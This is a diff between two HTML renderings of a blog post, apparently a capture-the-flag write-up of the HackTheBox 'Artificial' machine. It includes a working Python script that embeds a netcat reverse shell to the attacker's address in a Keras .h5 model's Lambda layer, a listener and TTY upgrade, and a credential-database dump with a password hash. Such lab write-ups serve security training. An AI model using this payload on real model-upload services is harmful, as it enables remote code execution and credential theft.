@@ -1,20 +1,169 @@
-<!doctype html><html><head><title>HackTheBox: Artificial | 0xD3f3c7</title><style>body{background-color:#000;color:#fff;font-family:monospace;padding:20px;max-width:800px;margin:auto;line-height:1.6}pre{background-color:#1a1a1a;padding:15px;border-radius:5px;overflow-x:auto}h1,h2,h3,h4,h5,h6{color:#0f0}a{color:#8a2be2;text-decoration:none}a:hover{text-decoration:underline}details summary{outline:none}</style></head><body><h1>HackTheBox: Artificial</h1><hr><h3 id=port-scan>Port Scan</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>
-</span></span><span style=display:flex><span>rustscan -a 10.10.11.74 -- -A | tee rustscan.log
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>Open 10.10.11.74:22
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>Open 10.10.11.74:80
-</span></span></code></pre></div><h3 id=identify-target-and-add-to-hosts-file>Identify Target and Add to Hosts File</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>
-</span></span><span style=display:flex><span>URL: http://10.10.11.74
-</span></span></code></pre></div><p>Upon visiting the IP in a browser, we are redirected to:</p><pre tabindex=0><code>	
+<!DOCTYPE html>
+<html lang="en-us">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    
+    <title>HackTheBox: Artificial | 0xD3f3c7</title>
+    <meta name="viewport" content="width=device-width,minimum-scale=1">
+    <meta name="description" content="Port Scan rustscan -a 10.10.11.74 -- -A | tee rustscan.log Open 10.10.11.74:22 Open 10.10.11.74:80 Identify Target and Add to Hosts File URL: http://10.10.11.74 Upon visiting the IP in a browser, we are redirected to:
+http://artificial.htb Add this domain to /etc/hosts:
+sudo nano /etc/hosts 10.10.11.74 artificial.htb Web Enumeration Login and registration pages: http://artificial.htb/login
+http://artificial.htb/register
+Notes: Artificial is a platform that lets you easily build, test, and deploy AI models to solve real-world problems like sales forecasting.">
+    <meta name="generator" content="Hugo 0.131.0">
+    
+    
+    
+      <meta name="robots" content="index, follow">
+    
+    
+
+    
+<link rel="stylesheet" href="/0xD3f3c7-Blog/ananke/css/main.min.d05fb5f317fcf33b3a52936399bdf6f47dc776516e1692e412ec7d76f4a5faa2.css" >
+
+
+
+
+    
+
+
+    
+      
+
+    
+
+    
+
+    
+      <link rel="canonical" href="https://0xD3f3c7.github.io/0xD3f3c7-Blog/posts/artificial/">
+    
+
+    <meta property="og:url" content="https://0xD3f3c7.github.io/0xD3f3c7-Blog/posts/artificial/">
+  <meta property="og:site_name" content="0xD3f3c7">
+  <meta property="og:title" content="HackTheBox: Artificial">
+  <meta property="og:description" content="Port Scan rustscan -a 10.10.11.74 -- -A | tee rustscan.log Open 10.10.11.74:22 Open 10.10.11.74:80 Identify Target and Add to Hosts File URL: http://10.10.11.74 Upon visiting the IP in a browser, we are redirected to:
+http://artificial.htb Add this domain to /etc/hosts:
+sudo nano /etc/hosts 10.10.11.74 artificial.htb Web Enumeration Login and registration pages: http://artificial.htb/login
+http://artificial.htb/register
+Notes: Artificial is a platform that lets you easily build, test, and deploy AI models to solve real-world problems like sales forecasting.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-09-02T08:17:12-04:00">
+    <meta property="article:modified_time" content="2025-09-02T08:17:12-04:00">
+
+  <meta itemprop="name" content="HackTheBox: Artificial">
+  <meta itemprop="description" content="Port Scan rustscan -a 10.10.11.74 -- -A | tee rustscan.log Open 10.10.11.74:22 Open 10.10.11.74:80 Identify Target and Add to Hosts File URL: http://10.10.11.74 Upon visiting the IP in a browser, we are redirected to:
+http://artificial.htb Add this domain to /etc/hosts:
+sudo nano /etc/hosts 10.10.11.74 artificial.htb Web Enumeration Login and registration pages: http://artificial.htb/login
+http://artificial.htb/register
+Notes: Artificial is a platform that lets you easily build, test, and deploy AI models to solve real-world problems like sales forecasting.">
+  <meta itemprop="datePublished" content="2025-09-02T08:17:12-04:00">
+  <meta itemprop="dateModified" content="2025-09-02T08:17:12-04:00">
+  <meta itemprop="wordCount" content="245">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="HackTheBox: Artificial">
+  <meta name="twitter:description" content="Port Scan rustscan -a 10.10.11.74 -- -A | tee rustscan.log Open 10.10.11.74:22 Open 10.10.11.74:80 Identify Target and Add to Hosts File URL: http://10.10.11.74 Upon visiting the IP in a browser, we are redirected to:
+http://artificial.htb Add this domain to /etc/hosts:
+sudo nano /etc/hosts 10.10.11.74 artificial.htb Web Enumeration Login and registration pages: http://artificial.htb/login
+http://artificial.htb/register
+Notes: Artificial is a platform that lets you easily build, test, and deploy AI models to solve real-world problems like sales forecasting.">
+
+      
+  
+
+
+    
+	
+  </head><body class="ma0 avenir bg-near-white production">
+
+    
+   
+  
+
+  <header>
+    <div class="bg-black">
+      <nav class="pv3 ph3 ph4-ns" role="navigation">
+  <div class="flex-l center items-center justify-between">
+    <a href="/0xD3f3c7-Blog/" class="f3 fw2 hover-white white-90 dib no-underline">
+      
+        0xD3f3c7
+      
+    </a>
+    <div class="flex-l items-center">
+      
+
+      
+      <div class="ananke-socials"></div>
+
+    </div>
+  </div>
+</nav>
+
+    </div>
+  </header>
+
+
+
+    <main class="pb7" role="main">
+      
+  
+  
+  <article class="flex-l mw8 center ph3 flex-wrap justify-between">
+    <header class="mt4 w-100">
+      <aside class="instapaper_ignoref b helvetica tracked ttu">
+          
+        Posts
+      </aside><div id="sharing" class="mt3 ananke-socials"></div>
+<h1 class="f1 athelas mt3 mb1">HackTheBox: Artificial</h1>
+      
+      
+      
+      <time class="f6 mv4 dib tracked" datetime="2025-09-02T08:17:12-04:00">September 2, 2025</time>
+      
+
+      
+      
+    </header>
+    <div class="nested-copy-line-height lh-copy serif f4 nested-links mid-gray pr4-l w-two-thirds-l"><hr>
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<h3 id="port-scan">Port Scan</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>rustscan -a 10.10.11.74 -- -A | tee rustscan.log
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Open 10.10.11.74:22
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Open 10.10.11.74:80
+</span></span></code></pre></div><h3 id="identify-target-and-add-to-hosts-file">Identify Target and Add to Hosts File</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>URL: http://10.10.11.74
+</span></span></code></pre></div><p>Upon visiting the IP in a browser, we are redirected to:</p>
+<pre tabindex="0"><code>	
 http://artificial.htb
-</code></pre><p>Add this domain to <code>/etc/hosts</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>
-</span></span><span style=display:flex><span>sudo nano /etc/hosts
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>10.10.11.74 artificial.htb
-</span></span></code></pre></div><h3 id=web-enumeration>Web Enumeration</h3><ul><li>Login and registration pages:</li></ul><p>  <a href=http://artificial.htb/login>http://artificial.htb/login</a></p><p>  <a href=http://artificial.htb/register>http://artificial.htb/register</a></p><ul><li>Notes:</li></ul><blockquote><p>Artificial is a platform that lets you easily build, test, and deploy AI models to solve real-world problems like sales forecasting.</p></blockquote><h3 id=directory-scan-using-ffuf>Directory Scan Using ffuf</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>
-</span></span><span style=display:flex><span>ffuf -u http://artificial.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
-</span></span></code></pre></div><p>Results:</p><pre tabindex=0><code>
+</code></pre><p>Add this domain to <code>/etc/hosts</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sudo nano /etc/hosts
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>10.10.11.74 artificial.htb
+</span></span></code></pre></div><h3 id="web-enumeration">Web Enumeration</h3>
+<ul>
+<li>Login and registration pages:</li>
+</ul>
+<p>  <a href="http://artificial.htb/login">http://artificial.htb/login</a></p>
+<p>  <a href="http://artificial.htb/register">http://artificial.htb/register</a></p>
+<ul>
+<li>Notes:</li>
+</ul>
+<blockquote>
+<p>Artificial is a platform that lets you easily build, test, and deploy AI models to solve real-world problems like sales forecasting.</p>
+</blockquote>
+<h3 id="directory-scan-using-ffuf">Directory Scan Using ffuf</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ffuf -u http://artificial.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
+</span></span></code></pre></div><p>Results:</p>
+<pre tabindex="0"><code>
 /login         [Status: 200]
 
 /register      [Status: 200]
@@ -22,60 +171,150 @@ http://artificial.htb
 /logout        [Status: 302]
 
 /dashboard     [Status: 302]
-</code></pre><h3 id=registration>Registration</h3><p>Register a new user at <code>/register</code>:</p><p><img src=artificialregister.png alt="Register page"></p><h3 id=login>Login</h3><p>Login using the credentials at <code>/login</code>:</p><p><img src=artificiallogin.png alt="Login page"></p><h3 id=exploit-malicious-h5-upload>Exploit: Malicious .h5 Upload</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#f92672>import</span> tensorflow <span style=color:#66d9ef>as</span> tf
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>exploit</span>(x):
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>    <span style=color:#f92672>import</span> os
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>    os<span style=color:#f92672>.</span>system(<span style=color:#e6db74>&#34;rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.93 6666 &gt;/tmp/f&#34;</span>)
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> x
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>model <span style=color:#f92672>=</span> tf<span style=color:#f92672>.</span>keras<span style=color:#f92672>.</span>Sequential()
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>model<span style=color:#f92672>.</span>add(tf<span style=color:#f92672>.</span>keras<span style=color:#f92672>.</span>layers<span style=color:#f92672>.</span>Input(shape<span style=color:#f92672>=</span>(<span style=color:#ae81ff>64</span>,)))
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>model<span style=color:#f92672>.</span>add(tf<span style=color:#f92672>.</span>keras<span style=color:#f92672>.</span>layers<span style=color:#f92672>.</span>Lambda(exploit))
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>model<span style=color:#f92672>.</span>compile()
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>model<span style=color:#f92672>.</span>save(<span style=color:#e6db74>&#34;exploit.h5&#34;</span>)
-</span></span></code></pre></div><p>Upload <code>exploit.h5</code>:</p><p><img src=artificialuploadmodel.png alt="Upload model"></p><h3 id=listener>Listener</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>
-</span></span><span style=display:flex><span>nc -lvnp <span style=color:#ae81ff>6666</span>
-</span></span></code></pre></div><h3 id=trigger-shell>Trigger Shell</h3><p>Click on view predictions:</p><p><img src=viewpredicitons.png alt="View predictions"></p><p>Get TTY:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>
-</span></span><span style=display:flex><span>python3 -c <span style=color:#e6db74>&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#f92672>[</span>Ctrl+Z<span style=color:#f92672>]</span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>stty raw -echo; fg
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>export TERM<span style=color:#f92672>=</span>xterm
-</span></span></code></pre></div><h3 id=enumerate-db-files>Enumerate .db files</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>
-</span></span><span style=display:flex><span>find / -name <span style=color:#e6db74>&#34;*.db*&#34;</span> 2&gt;/dev/null
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>sqlite3 /home/app/app/instance/users.db
-</span></span></code></pre></div><p>Tables:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span>
-</span></span><span style=display:flex><span>.tables
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#66d9ef>SELECT</span> <span style=color:#f92672>*</span> <span style=color:#66d9ef>FROM</span> <span style=color:#66d9ef>user</span>;
-</span></span></code></pre></div><p>Example:</p><pre tabindex=0><code>
+</code></pre><!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<h3 id="registration">Registration</h3>
+<p>Register a new user at <code>/register</code>:</p>
+<p><img src="artificialregister.png" alt="Register page"></p>
+<h3 id="login">Login</h3>
+<p>Login using the credentials at <code>/login</code>:</p>
+<p><img src="artificiallogin.png" alt="Login page"></p>
+<h3 id="exploit-malicious-h5-upload">Exploit: Malicious .h5 Upload</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> tensorflow <span style="color:#66d9ef">as</span> tf
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exploit</span>(x):
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">import</span> os
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.93 6666 &gt;/tmp/f&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> x
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>model <span style="color:#f92672">=</span> tf<span style="color:#f92672">.</span>keras<span style="color:#f92672">.</span>Sequential()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>model<span style="color:#f92672">.</span>add(tf<span style="color:#f92672">.</span>keras<span style="color:#f92672">.</span>layers<span style="color:#f92672">.</span>Input(shape<span style="color:#f92672">=</span>(<span style="color:#ae81ff">64</span>,)))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>model<span style="color:#f92672">.</span>add(tf<span style="color:#f92672">.</span>keras<span style="color:#f92672">.</span>layers<span style="color:#f92672">.</span>Lambda(exploit))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>model<span style="color:#f92672">.</span>compile()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>model<span style="color:#f92672">.</span>save(<span style="color:#e6db74">&#34;exploit.h5&#34;</span>)
+</span></span></code></pre></div><p>Upload <code>exploit.h5</code>:</p>
+<p><img src="artificialuploadmodel.png" alt="Upload model"></p>
+<h3 id="listener">Listener</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>nc -lvnp <span style="color:#ae81ff">6666</span>
+</span></span></code></pre></div><h3 id="trigger-shell">Trigger Shell</h3>
+<p>Click on view predictions:</p>
+<p><img src="viewpredicitons.png" alt="View predictions"></p>
+<p>Get TTY:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>python3 -c <span style="color:#e6db74">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Ctrl+Z<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>stty raw -echo; fg
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>export TERM<span style="color:#f92672">=</span>xterm
+</span></span></code></pre></div><!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<h3 id="enumerate-db-files">Enumerate .db files</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>find / -name <span style="color:#e6db74">&#34;*.db*&#34;</span> 2&gt;/dev/null
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sqlite3 /home/app/app/instance/users.db
+</span></span></code></pre></div><p>Tables:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>.tables
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> <span style="color:#66d9ef">user</span>;
+</span></span></code></pre></div><p>Example:</p>
+<pre tabindex="0"><code>
 1|gael|gael@artificial.htb|HASH
 
 6|whoameye|whoameye@gmail.com|5f4dcc3b5aa765d61d8327deb882cf99
-</code></pre><p>Login as Gael:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>
-</span></span><span style=display:flex><span>su - gael
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>cat ~/user.txt
-</span></span></code></pre></div><p>Confirm container:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>
-</span></span><span style=display:flex><span>hostname
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>cat /etc/hosts
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>find / -name container 2&gt;/dev/null
-</span></span></code></pre></div><h3 id=host-enumeration>Host Enumeration</h3><ul><li><p>Search for backups</p></li><li><p>Exfiltrate backup</p></li><li><p>Analyze <code>backrest</code> files</p></li><li><p>Crack passwords</p></li></ul><h3 id=privilege-escalation>Privilege Escalation</h3><ul><li><p>Add repo and run backup</p></li><li><p>Dump snapshot files</p></li><li><p>Root obtained</p></li></ul><p><img src=fcde9198-a3ae-4ca9-a6cf-29a22afc115d.png alt="Root obtained"></p><p>That wraps up my first HackTheBox writeup.</p><p>Hope you learned something new!</p><p>Happy hacking, 0xD3f3c7</p></body></html>
+</code></pre><p>Login as Gael:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>su - gael
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>cat ~/user.txt
+</span></span></code></pre></div><p>Confirm container:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>hostname
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>cat /etc/hosts
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>find / -name container 2&gt;/dev/null
+</span></span></code></pre></div><h3 id="host-enumeration">Host Enumeration</h3>
+<ul>
+<li>
+<p>Search for backups</p>
+</li>
+<li>
+<p>Exfiltrate backup</p>
+</li>
+<li>
+<p>Analyze <code>backrest</code> files</p>
+</li>
+<li>
+<p>Crack passwords</p>
+</li>
+</ul>
+<h3 id="privilege-escalation">Privilege Escalation</h3>
+<ul>
+<li>
+<p>Add repo and run backup</p>
+</li>
+<li>
+<p>Dump snapshot files</p>
+</li>
+<li>
+<p>Root obtained</p>
+</li>
+</ul>
+<p><img src="fcde9198-a3ae-4ca9-a6cf-29a22afc115d.png" alt="Root obtained"></p>
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<p>That wraps up my first HackTheBox writeup.</p>
+<p>Hope you learned something new!</p>
+<p>Happy hacking, 0xD3f3c7</p>
+<!-- raw HTML omitted -->
+<ul class="pa0">
+  
+</ul>
+<div class="mt6 instapaper_ignoref">
+      
+      
+      </div>
+    </div>
+
+    <aside class="w-30-l mt6-l">
+
+
+
+
+</aside>
+
+  </article>
+
+    </main>
+    <footer class="bg-black bottom-0 w-100 pa3" role="contentinfo">
+  <div class="flex justify-between">
+  <a class="f4 fw4 hover-white white-70 dn dib-ns pv2 ph3 no-underline" href="https://0xD3f3c7.github.io/0xD3f3c7-Blog/" >
+    &copy;  0xD3f3c7 2025 
+  </a>
+    <div><div class="ananke-socials"></div>
+</div>
+  </div>
+</footer>
+
+  </body>
+</html>
